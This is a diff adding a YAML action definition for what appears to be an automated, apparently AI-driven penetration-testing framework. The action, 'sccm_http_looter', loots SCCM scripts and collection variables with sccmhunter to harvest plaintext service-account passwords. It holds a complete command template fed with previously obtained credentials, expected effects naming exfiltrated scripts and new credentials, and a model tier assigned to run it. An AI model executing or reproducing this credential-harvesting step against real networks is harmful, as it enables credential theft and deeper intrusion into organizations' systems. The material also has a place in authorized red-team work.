@@ -1,0 +1,34 @@
+name: sccm_http_looter
+category: sccm
+description: SCCM CRED-3 — loot plaintext scripts/collection-vars from SMS Provider
+preconditions:
+- has_cred
+- sccm_admins_enumerated
+parameters:
+  sms_provider: from_engagement.sms_provider
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+command_template: sccmhunter get -u {username} -p '{password}' -d {domain} -tm {sms_provider}
+  --scripts --collections
+parser: generic_parser
+expected_effects:
+- sccm_scripts_exfiltrated
+- sccm_collection_vars_obtained
+- has_cred
+falsifier:
+  pattern: ACCESS_DENIED|no scripts|WBEM_E_NOT_FOUND
+  timeout: 180
+model_tier: haiku
+mechanism: 'SCCM Scripts and CollectionVariables are WMI objects readable by Full
+  Admins (and
+
+  sometimes by lesser roles). Hardcoded credentials in deployment scripts or task
+
+  sequences routinely include service-account passwords in plaintext.
+
+  '
+references:
+  ocd_mindmap: 'Branch 12: SCCM CRED-3 (Scripts / CollectionVariables)'
+  hacktricks: windows-hardening/active-directory-methodology/pentesting-sccm.md
+hacktricks_ref: windows-hardening/active-directory-methodology/abusing-ad-mssql.md
